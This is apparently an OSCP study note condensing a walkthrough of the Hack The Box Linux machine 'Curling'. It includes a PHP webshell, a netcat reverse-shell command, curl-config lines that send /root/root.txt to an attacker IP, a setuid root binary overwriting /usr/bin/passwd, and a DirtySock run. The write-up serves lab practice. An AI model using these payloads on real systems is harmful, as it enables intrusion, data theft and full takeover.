## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

---

### 🧭 Recon

**Nmap full TCP scan:**
```
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.150
```
Ports open:
- 22/tcp (SSH)
- 80/tcp (HTTP)

**Nmap scripts and version detection:**
```
nmap -p 22,80 -sV -sC -oA nmap/scripts 10.10.10.150
```
Identified:
- [Apache](HTTP) 2.4.29 (Ubuntu)
- [OpenSSH](SSH) 7.6p1
- Joomla CMS on port 80

---

### 🌐 Joomla Web Enumeration

- Default page has a Joomla site titled "Curling"
- HTML source hint: `<!-- secret.txt -->`
- Navigating to `/secret.txt` reveals base64: `Q3VybGluZzIwMTgh`
- Decoded: `Curling2018!`
- Admin panel at `/administrator`, login successful with:
  - **Username**: floris
  - **Password**: Curling2018!

---

### ⚙️ Shell as www-data

**Webshell via Template Injection:**
1. Go to Templates → Beez3 → New File → PHP
2. Create `sh3ll.php` with `<?php system($_GET['0xdf']); ?>`
3. Access: `http://10.10.10.150/templates/beez3/sh3ll.php?0xdf=id`

**Interactive shell via reverse shell:**
```bash
http://10.10.10.150/templates/beez3/sh3ll.php?0xdf=cat%20/tmp/df%20|%20/bin/sh%20-i%202%3E%261%20|%20nc%2010.10.14.5%20443%20%3E%20/tmp/df
```
Listener:
```
nc -lnvp 443
```
User: `www-data`

---

### 📂 Privesc: www-data → floris

**Found in /home/floris/**:
- `password_backup`: hex-encoded multi-layer compressed file

**Extraction Process:**
1. Convert hex to binary: `xxd -r`
2. Unpack chain: `bunzip2` → `gunzip` → `bunzip2` → `tar`
3. Final file: `password.txt`

**Credentials:**
```
Username: floris
Password: 5d<wdCbdZu)|hChXll
```

Login:
```bash
su - floris
```

---

### 🔁 Privesc: floris → root

**Found folder**: `/home/floris/admin-area`

Files:
- `input`: curl config file
- `report`: output file

**pspy shows:**
```
curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```
Runs as root every minute.

**Exfil root flag via POST:**
```text
url = "http://10.10.14.5"
data = @/root/root.txt
```
Setup listener:
```
nc -nlvp 80
```

**Alternative:** Read directly from file:
```text
url = "file:///root/root.txt"
output = /tmp/.0xdf
```

---

### 🧨 Root Shell via Overwrite

Create a C program:
```c
void main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", 0);
}
```
Compile:
```
gcc -o setuid setuid.c
```
Host on HTTP server, then:
```text
url = "http://10.10.14.5/setuid"
output = /usr/bin/passwd
```
When cron runs:
```
/usr/bin/passwd → root shell
```

---

### 🧪 Beyond Root: Dirty Sock Exploit

**snapd version**: vulnerable
```
snap version
```
Upload & run DirtySock:
```
python3 dirty_sockv2.py
```
New user created:
- **Username**: dirty_sock
- **Password**: dirty_sock

Root access:
```bash
su dirty_sock
sudo su
```

**Note**: Setuid scripts (like Python) don't elevate privileges on most Linux systems.


**Source**: https://0xdf.gitlab.io/2021/03/30/htb-curling.html

